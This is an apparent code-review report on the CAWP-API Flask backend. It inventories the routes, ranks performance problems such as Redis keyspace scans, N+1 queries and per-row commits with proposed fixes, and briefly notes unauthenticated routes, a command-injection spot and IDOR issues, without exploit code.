# CAWP-API Backend Review (read-only)

**Scope:** `CAWP-API/app.py` (9,066 lines, 159 routes, 29 models), `classes/ServerSideDataHandler.py`,
`classes/FilterServerSide.py`, `redis_cache/redis.py`, `issable/db_connection.py`, `requirements.txt`, `Dockerfile`.
Stack: Flask 2.3.3 / Flask-SQLAlchemy 3.0.5 / SQLAlchemy 2.0.20 / PostgreSQL / Redis (pickle) /
Flask-SocketIO 5.5.1 (`threading`) / Flask-JWT-Extended 4.5.2 / pandas+openpyxl.

**Headline:** the hot client-list endpoints (`/clints`, `/clints/neglect`, `/clints/have_payments`,
`/clints/not_have_payments`, `/portfolios`) have already been migrated to SQL-side pagination
(look for the `=== PATCH_* APPLIED ===` markers). What remains slow is (a) **every `/export` twin**,
which still does a full `redis_obj.keys()` keyspace scan or a full-table load plus per-row N+1,
(b) the comments/payments/payment-date lists, and (c) `updateClintInRedis()`, which now costs
~8 extra queries on every write for a cache that almost nothing reads any more.
Separately, **48 of 159 routes have no `@jwt_required()` at all**, including `/dashboard`,
`/clints/have_payments`, `/clints DELETE` and `/clint/archive/ids`.

---

## 1. Route inventory

Legend for **Data access**: `single-row` · `paged-in-SQL` · `FULL-LOAD→py` (loads `.all()` then
sorts/filters/pages in Python via `srverSideMode` / `exportServerSideMode` / `pagination_filter_clients`) ·
`N+1` · `redis` · `xls-in` · `xls-out` · `ext-mysql` · `redis-KEYS` (full/partial keyspace scan).

| Line | Method + Path | Decorators | Purpose | Data access |
|---|---|---|---|---|
| 925 | GET `/` | – | redirect to `/login` | n/a |
| 935 | PUT `/clint/lock/<id>` | jwt | lock client | single-row + `updateClintInRedis` (~8 q) |
| 974 | PUT `/clint/unlock/<id>` | jwt | unlock client | single-row + `updateClintInRedis` |
| 1013 | GET `/clint/lock-history/<id>` | jwt | lock/unlock audit trail | N+1 (`User.query.get` per row, 1029) |
| 1043 | PUT `/clints/bulk-lock` | jwt | bulk lock | N+1 + `updateClintInRedis` per id (1059,1073) |
| 1091 | PUT `/clints/bulk-unlock` | jwt | bulk unlock | N+1 + `updateClintInRedis` per id |
| 1139 | GET,POST `/api/file/upload` | jwt | parse xlsx → headers+rows | xls-in (loads workbook **twice**, 1149/1161) |
| 1180 | POST `/api/file/upload/SepcifyUsersByExcel` | jwt | same, no header check | xls-in (loads twice) |
| 1221 | POST `/api/file/upload/ByExcel` | jwt | same | xls-in (loads twice) |
| 1262 | POST `/api/v2/file/upload/ByExcel` | jwt | same, returns filename only | xls-in (loads twice) |
| 1302 | POST `/clint/SepcifyUsersByExcel` | jwt | assign collector from xlsx rows | xls-in + N+1 + commit-per-row + redis |
| 1352 | POST `/clint/addClintsByExcel` | jwt | create portfolio + import clients | xls-in + N+1 + commit-per-row (`insertClints` 1413) |
| 1525 | POST `/login` | **none** | login, issues JWT + sets Flask session | single-row |
| 1559 | POST `/refresh` | jwt | re-issue token | single-row |
| 1579 | GET `/loginLog/user/<id>` | jwt | last logins | single-row (`.limit(10)` **before** sort → bug) |
| 1601 | GET `/uesrs` | jwt | users grid | FULL-LOAD→py (batched maps, no N+1) |
| 1692 | GET `/uesrs/export` | jwt | users export | FULL-LOAD→py + **N+1** (`get_supervisor`, counts per user) + xls-out |
| 1757 | GET `/users/<id>` | jwt | user detail | single-row |
| 1778 | POST `/uesrs` | jwt | create user | single-row |
| 1798 | PUT `/uesrs/<id>` | jwt | update user | single-row |
| 1837 | PUT `/user/inactive/<id>` | jwt | deactivate | single-row |
| 1853 | PUT `/user/active/<id>` | jwt | activate | single-row |
| 1874 | GET `/roles` | **none** | roles grid | FULL-LOAD→py |
| 1891 | POST `/roles` | jwt | create role | single-row |
| 1922 | PUT `/roles/<id>` | jwt | update role | single-row |
| 1956 | GET `/roles/<id>` | jwt | role + permission array | single-row |
| 1979 | GET `/nationalities` | jwt | list | FULL-LOAD→py (small) |
| 1998 | GET `/nationalities/<id>` | jwt | detail | single-row |
| 2011 | POST `/nationalities` | jwt | create | single-row |
| 2029 | PUT `/nationalities/<id>` | jwt | update | single-row |
| 2047 | GET `/updateSides` | jwt | list | FULL-LOAD→py (small) |
| 2066 | GET `/updateSides/<id>` | jwt | detail | single-row |
| 2079 | POST `/updateSides` | jwt | create | single-row |
| 2097 | PUT `/updateSides/<id>` | jwt | update | single-row |
| 2114 | POST `/clints/update/byexcel` | jwt | bulk update amount/name/contact | xls-in + N+1 + commit-per-row + redis |
| 2211 | POST `/clints/attribute/byexcel` | jwt | bulk set `attribute` key | xls-in, **batched** (good) + redis per row |
| 2293 | GET `/branches` | jwt | list (no paging) | FULL-LOAD (small) |
| 2307 | GET `/branches/<id>` | jwt (`required_roles` commented) | detail | single-row |
| 2321 | POST `/branches` | jwt (commented) | create | single-row |
| 2340 | PUT `/branches/<id>` | jwt (commented) | update | single-row |
| 2359 | GET `/contracts` | jwt (commented) | contracts + counts | FULL-LOAD→py + **N+1 aggregates** (2 scalar q per contract) |
| 2399 | GET `/contracts/<id>` | jwt (commented) | detail | single-row |
| 2413 | POST `/contracts` | jwt (commented) | create | single-row |
| 2432 | PUT `/contracts/<id>` | jwt (commented) | update | single-row |
| 2453 | PUT `/contract/deactivate/<id>` | jwt | deactivate | single-row |
| 2469 | PUT `/contract/activate/<id>` | jwt | activate | single-row |
| 2488 | GET `/cdr` | **none** | today's Asterisk CDR | ext-mysql (`SELECT *`, unbounded) |
| 2499 | GET `/cdr_by_date` | jwt | CDR + call-center by date/numbers | ext-mysql (f-string SQL) |
| 2529 | GET `/cdr/recording` | jwt | stream call recording over SSH | ext-mysql + SSH (**cmd injection**) |
| 3100 | GET `/clints` | jwt | main client grid | **paged-in-SQL** (`_build_clints_payload`, 2566) |
| 3111 | GET `/v2/clints` | jwt | client lookup/search page | paged-in-SQL + **cartesian join bug** (3212) + py IN-list (3196) |
| 3246 | GET `/clients/export` | jwt | client grid export | xls-out, full result set, single SQL (OK) |
| 3257 | GET `/clients/archive/export` | jwt | archive export | FULL-LOAD + **N+1** (lazy rels, `clint.comments[-1]`) + xls-out |
| 3430 | GET `/clints/<id>` | jwt | client detail | single-row + 3 lookups |
| 3472 | PUT `/clints/<id>` | jwt, check_client_lock | update client | single-row + `updateClintInRedis` |
| 3502 | PUT `/clints/delinquency/<id>` | jwt | set delinquency reason | single-row + `updateClintInRedis` |
| 3524 | GET `/clints/user/<id>` | jwt | one collector's clients | **redis-KEYS** `*<user_id>*` + FULL-LOAD→py |
| 3540 | GET `/clints/archive/` | jwt | archive grid | paged-in-SQL + **N+1** (lazy rels, `comments[-1]`) |
| 3716 | GET `/clints/archive/reson` | jwt | archive-reason list | FULL-LOAD→py |
| 3733 | POST `/clints/archive/reson` | jwt | create | single-row |
| 3748 | GET `/clints/archive/reson/<id>` | jwt | detail | single-row |
| 3760 | PUT `/clints/archive/reson/<id>` | jwt | update | single-row |
| 3778 | GET `/clints/delinquency_reasons` | jwt | list | FULL-LOAD (small) |
| 3792 | POST `/clints/delinquency_reasons` | jwt | create | single-row |
| 3808 | GET `/clints/delinquency_reasons/<id>` | jwt | detail | single-row |
| 3821 | PUT `/clints/delinquency_reasons/<id>` | jwt | update | single-row |
| 3840 | GET `/clint_contact_types` | jwt | list | FULL-LOAD (small) |
| 3854 | POST `/clint_contacts` | jwt | create contact | single-row |
| 3873 | GET `/comment_status` | **none** | comment statuses | FULL-LOAD→py + **N+1** (contract+reachability per row) |
| 3905 | POST `/comment_status` | **none** | create | single-row |
| 3920 | GET `/comment_status/<id>` | **none** | detail | single-row |
| 3933 | PUT `/comment_status/<id>` | **none** | update | single-row |
| 3952 | GET `/comment_reachability` | **none** | list | FULL-LOAD (small) |
| 3965 | POST `/comments` | jwt, check_client_lock | add call note | single-row + `updateClintInRedis` |
| 3987 | POST `/commentsbyexcel` | jwt | bulk add notes from xlsx | xls-in + N+1 + commit-per-row + redis |
| 4118 | GET `/comments` | **none** | all-users comments report | FULL-LOAD→py (joinedload, date-ranged) |
| 4190 | GET `/comments/export` | **none** | same, export | FULL-LOAD + N+1 (reachability, 4235) + xls-out |
| 4267 | GET `/comments/current_user` | jwt | my comments | FULL-LOAD→py + **N+1 (7 q/row)** |
| 4327 | GET `/comments/current_user/export` | jwt | same, export | FULL-LOAD + N+1 (7 q/row) + xls-out |
| 4385 | GET `/comments/<id>` | **none** | detail | single-row |
| 4398 | GET `/comments/clint/<id>` | **none** | client timeline | **N+1 (4 q/row)** |
| 4425 | DELETE `/comments/<id>` | **none** | hard delete comment | single-row + `updateClintInRedis` |
| 4442 | GET `/contacts/identityNumber/<n>` | **none** | contacts by national id | N+1 + O(n²) dedup (4453) |
| 4467 | GET `/collection_types` | **none** | list | FULL-LOAD (small) |
| 4480 | GET `/collection_methods` | **none** | list | FULL-LOAD→py |
| 4496 | POST `/collection_methods` | **none** | create | single-row |
| 4511 | GET `/collection_methods/<id>` | **none** | detail | single-row |
| 4523 | PUT `/collection_methods/<id>` | **none** | update | single-row |
| 4539 | GET `/payments` | jwt | payments report | FULL-LOAD→py (joinedload + batched maps) |
| 4655 | GET `/payments/user` | jwt | my payments | FULL-LOAD→py + **N+1 (6 q/row)** |
| 4708 | GET `/payments/user/export` | jwt | same, export | FULL-LOAD + N+1 + xls-out |
| 4762 | GET `/payments/export` | jwt | payments export | FULL-LOAD + **N+1 (6 q/row)** + xls-out |
| 4859 | GET `/payment/<id>` | **none** | detail | single-row |
| 4872 | PUT `/payment/<id>` | **none** | edit payment | single-row + Python SUM loop |
| 4909 | GET `/payments/approval_status` | jwt | approved payments grid | FULL-LOAD→py (batched maps) |
| 5027 | GET `/payments/approval_status/export` | jwt | same, export | FULL-LOAD→py + xls-out |
| 5140 | DELETE `/payments/<id>` | jwt | delete payment | single-row |
| 5156 | POST `/payment` | jwt, check_client_lock | create payment | single-row + Python SUM loop |
| 5185 | PUT `/payment/approve/<id>` | jwt | approve | single-row + Python SUM loop |
| 5216 | PUT `/payment/reject/<id>` | jwt | reject | single-row |
| 5235 | GET `/payments/clint/<id>` | **none** | payments of a client | N+1 (3 q/row) |
| 5255 | GET `/payments/clint/<id>/total` | **none** | total paid | Python SUM (should be SQL `SUM`) |
| 5269 | GET `/contact_methods` | **none** | list | FULL-LOAD (small) |
| 5282 | POST `/payment_date` | jwt, check_client_lock | create promise-to-pay | single-row + Python SUM loop |
| 5315 | GET `/payment_date/clint/<id>` | **none** | PTPs of a client | N+1 (2 q/row) |
| 5334 | GET `/payment_date` | **none** | all PTPs report | FULL-LOAD→py + **N+1 (8 q/row, one query run twice)** |
| 5380 | GET `/payment_date/export` | **none** | same, export | FULL-LOAD + N+1 + xls-out |
| 5425 | GET `/payment_date/currentUser` | jwt | my PTPs | FULL-LOAD→py + N+1 (8 q/row) |
| 5477 | GET `/payment_date/currentUser/export` | jwt | same, export | FULL-LOAD + N+1 + xls-out |
| 5524 | GET `/payment_date/user` | jwt | PTPs of my clients | **N+1 (1 q per client + 2 per PTP)** |
| 5550 | POST `/clint_contact` | **none** | create contact | single-row |
| 5566 | DELETE `/clint_contact/<id>` | jwt | soft delete contact | single-row (bulk UPDATE) |
| 5591 | PUT `/clint_contact/default/<id>` | jwt | set default contact | single-row (2 bulk UPDATEs) |
| 5622 | PUT `/clint_contact/unset_default/<id>` | jwt | unset default | single-row |
| 5657 | POST `/clint/<id>/documents` | jwt | upload pdf/image | file upload to `static/clint_documents` |
| 5718 | GET `/clint/<id>/documents` | jwt | list documents | single query |
| 5736 | GET `/clint/document/<doc_id>/download` | jwt | stream document | single-row + `send_file` (**IDOR**) |
| 5759 | DELETE `/clint/document/<doc_id>` | jwt | soft delete | single-row (**IDOR**) |
| 5776 | PUT `/clint/archive/<id>` | **none** | archive one client | single-row + **redis-KEYS** |
| 5810 | PUT `/clint/archivebyexcel` | **none** | archive by xlsx | xls-in + N+1 + commit-per-row + redis-KEYS per row |
| 5851 | PUT `/clint/unarchivebyexcel` | **none** | unarchive by xlsx | xls-in + N+1 + `updateClintInRedis` per row |
| 5905 | PUT `/clint/unarchive/<id>` | **none** | unarchive one | single-row + redis |
| 5924 | PUT `/clint/archive/ids` | **none** | archive by id list | N+1 + commit-per-row + redis-KEYS per row |
| 5956 | GET `/supervisors` | jwt | supervisors grid | **N+1 (1 + 2·S + users+contracts)** |
| 5995 | GET `/supervisor/<id>` | jwt (commented roles) | detail | N+1 (small) |
| 6031 | POST `/supervisors` | jwt (commented) | create | single-row |
| 6056 | PUT `/supervisor/<id>` | jwt (commented) | replace contracts/users | N+1 + commit-per-row (**duplicates rows**) |
| 6095 | DELETE `/supervisor/<id>` | jwt (commented) | delete | single-row |
| 6114 | POST `/supervisor_contract` | **none** | attach contracts | commit-per-row |
| 6137 | POST `/supervisor_user` | **none** | attach users | commit-per-row |
| 6164 | GET `/portfolios` | jwt | portfolios grid | **paged-in-SQL** with aggregate subqueries (good) |
| 6294 | GET `/portfolios/export` | **none** | export | full result set in SQL + xls-out |
| 6386 | GET `/portfolio/<id>` | **none** | detail + totals | single-row + 3 aggregates |
| 6410 | PUT `/portfolio/<id>` | **none** | rename | single-row |
| 6426 | DELETE `/portfolios/<id>` | **none** | cascade delete portfolio | bulk delete + **redis-KEYS `*<id>*`** |
| 6465 | PUT `/clint/archive/portofolio/<id>` | jwt | archive whole portfolio | N+1 + **redis-KEYS per client** |
| 6516 | DELETE `/clint/<id>` | **none** | delete client | single-row + redis-KEYS |
| 6541 | DELETE `/clints` | **none** | delete clients by ids | N+1 + commit-per-row + redis-KEYS per id |
| 6569 | POST `/sepcifyusers/ids` | jwt | assign collector to ids | N+1 + commit-per-row + redis |
| 6610 | GET `/dashbord/user` | jwt | my counters | 4 aggregate queries (good) |
| 6637 | GET `/dashbord/collector` | jwt | collector dashboard v1 | FULL-LOAD + N+1 + **redis-KEYS** (`fetchClientsForUser`) |
| 6727 | GET `/dashbord/collector/v2` | jwt | collector dashboard v2 | FULL-LOAD (all my clients + 3 months comments/payments) |
| 6841 | GET `/dashbord/admin/dailyPayments/v2` | jwt | today's payments by collector | SQL GROUP BY (good) |
| 6883 | GET `/dashbord/admin/dailyPaymentDates/v2` | jwt | today's PTPs by collector | SQL GROUP BY (good, **no try/except**) |
| 6917 | GET `/dashbord/Allcollector/v2` | jwt | all-collector dashboard | **redis-cached** `dash_allcollector_v2_slim_v4`, TTL 120s, never invalidated + FULL-LOAD |
| 7035 | GET `/dashbord/commentsReport/v2` | jwt | today's comments + calls | FULL-LOAD + **ext-mysql** |
| 7081 | GET `/sepcifyusers/clint/<id>` | **none** | assignment history | N+1 + O(n²) (`sort` inside loop, 7102) |
| 7149 | POST `/send/notification` | jwt | push alarm to collectors | xls-in + N+1 + socket emit per row |
| 7189 | GET `/notifications` | jwt | my notifications | full load, no paging, **no try/except** |
| 7198 | PUT `/notifications/read/<id>` | jwt | mark read | single-row (**IDOR**) |
| 7278 | GET `/clints/not_have_payments` | **none** | clients with 0 payments | **paged-in-SQL** (but **no user scoping**) |
| 7530 | GET `/clints/not_have_payments/export` | **none** | export | **redis-KEYS `clint*`** + **2 COUNT/row** + xls-out |
| 7562 | GET `/clints/have_payments` | **none** | clients with payments | **paged-in-SQL** (no user scoping) |
| 7814 | GET `/clints/have_payments/export` | **none** | export | **redis-KEYS `clint*`** + 2 COUNT/row + xls-out |
| 7845 | GET `/clints/neglect` | jwt | neglect report | **paged-in-SQL** (good) |
| 8133 | GET `/clints/neglect/export` | jwt | export | **redis-KEYS** (`fetchClients`) + FULL-LOAD→py + xls-out |
| 8153 | GET `/clints/currentUser/have_nextCalls` | jwt | my next calls | **redis-KEYS `*<user_id>*`** + **1 query/client** + FULL-LOAD→py |
| 8211 | GET `/clints/currentUser/have_nextCalls/export` | jwt | same, export | redis-KEYS + 1 query/client + xls-out |
| 8921 | GET `/dashboard` | **none** | admin dashboard | **redis-cached** key `dash` TTL 150s + FULL-LOAD + **N+1 (8 q/comment)** + ext-mysql |

Non-route handlers: `@socketIO.on('join')` (207), `@app.errorhandler(404/500/405)` (1493/1504/1515),
`@jwt.user_identity_loader` (912), `@jwt.user_lookup_loader` (918).
`send_notification_to_user` (7109) is decorated `@jwt_required()` but is **not** a route — the decorator
is a no-op-with-side-effects there and should be removed.

---

## 2. Performance findings (ranked by user impact)

### P1 — Every `/export` twin still does a full Redis keyspace scan + N+1
**Files/lines:** `app.py:7530-7559` (`/clints/not_have_payments/export`), `app.py:7814-7843`
(`/clints/have_payments/export`), `app.py:8133-8151` (`/clints/neglect/export` → `fetchClients` 8523 →
`fetchClientsBySuperAdmin` 8568 / `fetchClientsByUser` 8557 / `getClintsBySupervisor` 8261),
`app.py:8211-8257` and `app.py:8153-8209` (`have_nextCalls` + export), `app.py:3524-3537` (`/clints/user/<id>`),
`app.py:6637-6724` (`/dashbord/collector` → `fetchClientsForUser` 8586).

**What happens:** `redis_obj.keys("clint*")` (or `"*"+user_id+"*"`) → `KEYS` is **O(total keys)** and blocks the
single-threaded Redis server for the whole scan; then `mget` of every value; then `pickle.loads` per client;
then for each client a fresh SQL query (`Payments.query.filter_by(...)` — and `.count()` is called **twice** at
7547/7548 and 7831/7832), then the whole list is sorted/filtered/paginated in Python via `exportServerSideMode`.
`getClintsBySupervisor` (8284) runs `KEYS` **once per supervised contract and per supervised user**.

**Blast radius:** every "تصدير Excel" button on التقارير (نشط/غير نشط، الإهمال، المكالمات القادمة),
plus the collector dashboard and the "clients of user X" screen. While one export runs, **Redis is blocked
for every other request in the app**, so the whole system freezes for all staff (this is exactly the failure
the comment at `app.py:7850` describes for `/clints/neglect`).

**Fix:** delete the Redis path entirely from these endpoints and reuse the SQL builders that already exist:
`_build_clints_payload(export_mode=True)` (2566) for client exports, and for the payments-count endpoints the
`payments_sq` aggregate subquery already written at 7320-7328. Pattern:
`func.count(Payments.id).over(...)` or a `GROUP BY` subquery joined once, `ORDER BY` + no `LIMIT` for export.
If any Redis scan must survive, at minimum replace `KEYS` with `SCAN` (`redis_cache/redis.py` has no `scan`
wrapper — add one) and maintain a Redis **set** of client ids per user instead of pattern-matching keys.

### P2 — `updateClintInRedis()` is now pure write-amplification
**File/line:** `app.py:7216-7273`, called from 965, 1004, 1073, 1121, 1333, 1479, 2155, 2168, 2179, 2275,
3490, 3514, 3978, 4041, 4435, 5895, 5917, 6599.

**What happens:** per client it runs `Portfolios.get` + `Contract.get` + latest `Comments` + `CommentStatuses.get`
+ `User.get` + `ClintArchive.get` + latest `SepcifyUsers` + `User.get` + `DelinquencyReason.get`
(**~9 queries**), then a `redis_obj.keys("clint:<id>*")` scan + `delete` + a `set` (**no TTL**).
Because `/clints`, `/clints/neglect`, `/clints/have_payments` etc. were migrated to SQL, the only remaining
readers are the export endpoints in P1 and `/clints/user/<id>`.

**Blast radius:** every comment save, payment save, lock/unlock, bulk lock, and every row of every Excel import.
`/clints/update/byexcel` on a 5,000-row file = 5,000 × (9 queries + a `KEYS` scan + a commit).
A bulk-lock of 500 clients = 500 `KEYS` scans inside one request.

**Fix:** once P1 removes the readers, delete `updateClintInRedis` and all its call sites. Interim: make it
fire-and-forget, drop the `KEYS` call (the key is deterministic except for `user_id`/`portfolios_id`, so
store a single key `clint:<id>` and put the scoping fields *inside* the value), and add a TTL via `setex`.

### P3 — Comments / payments / payment-date lists load everything then page in Python
**Files/lines:** `/comments` 4118-4188, `/comments/export` 4190-4264, `/comments/current_user` 4267-4324,
`/comments/current_user/export` 4327-4380, `/payments` 4539-4653, `/payments/user` 4655-4704,
`/payments/user/export` 4708-4756, `/payments/export` 4762-4854, `/payments/approval_status` 4909-5025,
`/payments/approval_status/export` 5027-5138, `/payment_date` 5334-5376, `/payment_date/export` 5380-5422,
`/payment_date/currentUser` 5425-5474, `/payment_date/currentUser/export` 5477-5521.

**What happens:** `.all()` over the whole date range, a dict built per row, then
`srverSideMode(rows, request)` (8818) sorts the *entire* list in Python, filters it in Python
(`my_filter` → `filter_mui`, 8739), runs `FilterServerSide` (which does a `request.args.get()` **and a
`print()` per row per filter** — `classes/FilterServerSide.py:150-151`), and finally slices `rows[start:end]`
(`my_pagination`, 8703). The N+1 versions are the worst: `/payment_date` runs **the identical
`Comments...first()` query twice per row** (5348 **and** 5349, repeated at 5394/5395, 5441/5442, 5493/5494).

**Blast radius:** التقارير → متابعات المستخدمين / مواعيد السداد / الدفعات, حسابات → الدفعات,
التحصيل → المستخدم الحالي. A month of comments on a busy portfolio is tens of thousands of rows
serialized and sorted per page-change.

**Fix:** move these to the `_build_clints_payload` pattern — one `db.session.query(...)` with explicit
joins and labelled columns, `COUNT`/`SUM` in a second light query, `.order_by(...).offset().limit()`.
`/payments` (4554) and `/comments` (4127) already use `joinedload`; they only need the sort/filter/page
translated to SQL columns (a `col_map`/`sort_map` dict like 2805/2861). Batch-fetch the lookup tables
(`CollectionTypes`, `CollectionMethods`, `CommentReachability`) into dicts once per request — 4590-4612
already does this correctly and is the template to copy into the other 10 handlers.

### P4 — `/dashboard` (8921) is the single most expensive endpoint, and its cache is wrong
**What happens:** on a cache miss it loads **all** contracts, **all** users, **all** comments in range with
**8 queries per comment** (9000-9025), all approved payments with **3 queries per payment** (9031-9041),
`fetchClientsBySuperAdmin()` (a full `KEYS clint*` scan, 8570), and then `Issable_db().GetCallsByDate()`
over the external MySQL. It then pickles the whole thing under key `"dash"` with `setex(..., 150, ...)`.

**Cache defects:** (a) the cached `comments` value is `rows` — the output of
`exportServerSideMode(comments_list, request)` (9057), i.e. **already filtered by the first caller's query
params**, so the next caller with different filters gets the first caller's filtered data;
(b) the key ignores `startDate`/`endDate` and the caller's identity; (c) nothing invalidates it on
comment/payment writes; (d) the cached branch (8936-8975) re-filters by date but never re-derives `contracts`,
`users` or `clients`.

**Blast radius:** لوحة التحكم للمسؤول. 150 s of stale + cross-contaminated data, and a several-minute
request every 150 s.

**Fix:** split into small aggregate endpoints (the `/dashbord/admin/dailyPayments/v2` pattern at 6846-6865 is
already correct — `GROUP BY` in SQL, no Python loops). Key the cache on
`(endpoint, start, end, user_or_role)`, cache the *unfiltered* aggregates, and drop the `Issable_db` call to a
separate lazy endpoint so a dead Asterisk host cannot stall the dashboard.

### P5 — `/v2/clints` cartesian join + Python `IN` list
**File/lines:** `app.py:3211-3212` and `app.py:3196-3205`.
`query.order_by(ClintArchive.create_at...)` is applied to a query whose FROM clause contains only
`clints ⋈ portfolios ⋈ contracts`; SQLAlchemy 2.0 silently adds `clintArchive` to the FROM list,
producing a **cross join** — `count()` and `paginate()` then both operate on rows×archives.
Separately, the mobile filter loads every matching `ClintContacts` row into Python and builds an
`IN (...)` list that can contain tens of thousands of literals.
**Fix:** `outerjoin(ClintArchive, Clints.clintArchive_id == ClintArchive.id)` before ordering by it; replace
the contact lookup with `Clints.identityNumber.in_(db.session.query(ClintContacts.identityNumber).filter(...))`
(a correlated subquery, no round-trip).

### P6 — `/clints/archive/` and `/clients/archive/export` N+1 through lazy relationships
**File/lines:** 3677-3704 and 3393-3420. The list comprehension touches `clint.portfolios`,
`clint.portfolios.contracts`, `clint.clintArchive.users`, `clint.clintArchive.archiveReasons`,
`clint.users` and — worst — **`clint.comments[-1]`**, which lazily loads *every* comment of that client
just to read the last one (and `[-1]` is not ordered, see §3).
`/clients/archive/export` additionally has **no pagination at all** (`query.all()` at 3390).
**Fix:** `.options(joinedload(...))` for the scalar relationships and a `latest_comment` outer join like the one
already built at 7331-7339 / 7986-7991, selecting `CommentStatuses.name/color` as labelled columns.

### P7 — `/contracts` and `/uesrs/export` per-row aggregates
`/contracts` (2359): for every contract, `get_countClints()`/`get_totalAmount()` (or the archive variants) each
run a `COUNT`/`SUM` with a join (`app.py:375-391`) → 2 aggregate queries per contract.
`/uesrs/export` (1692): per user, `get_supervisor()` (252) does 1 + 2·N queries, plus `get_countClints*`/
`get_totalAmount*` (263-280).
**Fix:** `/uesrs` (1601) already shows the fix — one `GROUP BY` query into `counts_map` (1637-1644) and
pre-built `roles_map`/`branches_map`. Apply the same to `/uesrs/export` and `/contracts`.

### P8 — `/supervisors` and `/sepcifyusers/clint/<id>`
`/supervisors` (5956): `1 + S×(1 user + 1 contracts query + C contract gets + 1 users query + U user gets)`.
`/sepcifyusers/clint/<id>` (7081): 2 `User.query.get` per row **and** `sepcifyusers_list.sort(...)` is called
**inside** the loop (7102) → O(n² log n).
**Fix:** batch `User.query.filter(User.id.in_(ids))` into a dict; move the `sort` after the loop.

### P9 — Excel import/export is synchronous, row-by-row, with a commit per row
**File/lines:** `insertClints` 1413-1482 (`db.session.commit()` per contact **and** per client, 1457/1478),
`/clints/update/byexcel` 2141/2154/2167/2178, `/commentsbyexcel` 4038, `/clint/SepcifyUsersByExcel` 1331,
`/clint/archivebyexcel` 5826/5830/5833, `/clints DELETE` 6554/6557, `/supervisor/<id>` PUT 6071/6076/6082/6086.
Each commit is a round trip + fsync; a 10k-row import is 20k+ commits and will exceed any proxy timeout
(the frontend sets `timeout: 0`, so the browser just hangs).
Also every upload route loads the workbook **twice** (`openpyxl.load_workbook(file)` at 1149 *and* 1161,
1190/1203, 1231/1244, 1272/1285) — 2× memory and parse time.
**Fix:** one `db.session.commit()` per batch (or `bulk_save_objects`), load the workbook once and
`wb.save(path)` from the same object, and move imports/exports to a background worker (RQ/Celery on the
existing Redis) returning a job id the frontend polls. `/clints/attribute/byexcel` (2211-2289) is already
written this way (single `in_()` fetch + single commit) and is the in-repo template.

### P10 — `Issable_db()` — a dead Asterisk host hangs the request (and the worker thread)
**File/lines:** `issable/db_connection.py:35-40` — `mysql.connector.connect()` with **no
`connection_timeout`** and no pooling; a new TCP connection per request to `10.10.0.220`.
Callers: `app.py:2491, 2503, 2539, 7067, 9046`.
If the host is firewalled/black-holed, the connect blocks at OS level (can be ~2 minutes). With
`async_mode='threading'` and the Flask dev server, each hung request pins a thread; `/dashboard` and
`/dashbord/commentsReport/v2` will take the whole app down with it.
`download_call_recording` (464) additionally opens a **paramiko SSH session per request** with no timeout
and reads the whole WAV into memory via `cat`.
**Fix:** `connection_timeout=3` (plus `mysql.connector.pooling.MySQLConnectionPool`), wrap every call in a
short timeout, and make the CDR/calls widgets separate lazy XHRs so the dashboard renders without them.
For recordings, use SFTP (`ssh.open_sftp().open(...)`) and stream instead of `cat`.

### P11 — SocketIO
`socketIO = SocketIO(app, cors_allowed_origins="*", async_mode='threading', ...)` (204). The only emit is
`socketIO.emit('alarm', ..., room=...)` at 7135, inside `send_notification_to_user`, which is called
**in a loop** from `/send/notification` (7179-7182) together with a DB insert + commit per client.
With `async_mode='threading'` the emit is a blocking write to each connected socket in that room, so a
1,000-row notification file = 1,000 commits + 1,000 synchronous socket writes inside one HTTP request.
Not a deadlock risk today (single room, small payload) but it should be queued.
**Also:** `app.run(...)` at 9066 and the Dockerfile's `flask run` both start the plain Flask/Werkzeug server —
`socketIO.run(app)` is never used, and there is no gunicorn/eventlet. That is a dev server in production.

### P12 — Pagination / sort / filter wire contract (needed for a SQL-side rewrite)
Read consistently from `request.args` (never from the body). The full set, with the code that parses it:

| Param | Where parsed | Default | Notes |
|---|---|---|---|
| `page` | 2587, 3135, 3549, 6172, 7292, 8647, 8707 | `1` | 1-based |
| `pageSize` | 2588, 3137, 3551, 6174, 7296, 8649, 8709 | **inconsistent: 200 / 1000 / 10 / 100** | `not_have_payments`/`have_payments` clamp to `1..500` (7299) |
| `field` | 2592, 8599, 8658, 8718 | – | dotted path, e.g. `portfolios.name`, `user_.frist_name` |
| `sort` | 2593 | – | `"asc"` / `"desc"` |
| `sort[key]` / `sort[order]` | 3158-3159, 3307-3308, 3596-3597 | – | **only** the archive + `/v2/clints` endpoints use this form |
| `filterOperator` | 2596 | – | MUI: `=,!=,>,>=,<,<=,contains,equals,startsWith,endsWith,is,not,after,onOrAfter,before,onOrBefore,isEmpty,isNotEmpty,isAnyOf` |
| `filterField`, `filterFieldType`, `filterValue` | 2597-2599 | – | type ∈ `number,string,date,singleSelect` |
| `filterValue[]` | 2600 | `[]` | repeated key, for `isAnyOf` |
| `customeFilterContractValue[]` | 2603 | `[]` | |
| `customeFilterUserValue[]` | 2604 | `[]` | |
| `customeFilterCommentStatusValue[]` *or* `customeFilterStatusesValue` | 2605-2609 | `[]` | `'0'` means "all" and is stripped |
| `customeFilterPortfoliosValue[]` | 2610 | `[]` | |
| `customeFilterBranchesValue[]` / `customeFilterBranchesValue2[]` | 2611 / 4549 | `[]` | `…2[]` is the *payment user's* branch |
| `customeFilterAttributeValue` | 2612 | – | substring match over the JSON `attribute` blob |
| `customeFilterPortfolioCreateAt{,From,To}Value` | 2623-2629 | – | `%Y-%m-%d`; reversed range auto-swapped (2632) |
| `customeFilterInquiryClintByExcelValue[file_name]` / `[index]` | 2645-2652 | – | reads `static/temp/<file_name>` with pandas |
| `customeFilterArchivingStatusesValue[]` | 1636, 1713, 2370, 6176 | `[]` | boolean-ish |
| `customeFilterDateValue[]` / `customeFilterMoveDateValue[]` | 4123, 4546 | – | `[start, end]`, `%Y-%m-%d`; **index [0]/[1] assumed present** |
| `selectedPortfolios_Qkey[]`, `selectedContracts_Qkey[]`, `selectedAccountNumber_Qkey`, `selectedUsers_Qkey[]`, `selectedArchiveBy_Qkey[]`, `SelectedResons_Qkey[]`, `SelectedCommentStatus_Qkey[]`, `selectedClients_Qkey[file_name]`/`[index]` | 3266-3285, 3553-3572 | – | archive screens only |
| `*_Qkey[]` + `*_Jkey` + `*_Type` + `*_Operator` | `FilterServerSide.py:165-233` | – | generic quad used by `srverSideMode`/`exportServerSideMode` |
| `per_page` | 8361 (`paginate`, **dead**) | `10` | not used by any live route |

A SQL-side rewrite stays wire-compatible if it reads exactly these names and keeps the defaults per endpoint.

---

## 3. Correctness bugs

1. **`generate_password_hash(..., method='sha256')` is invalid on the pinned Werkzeug.**
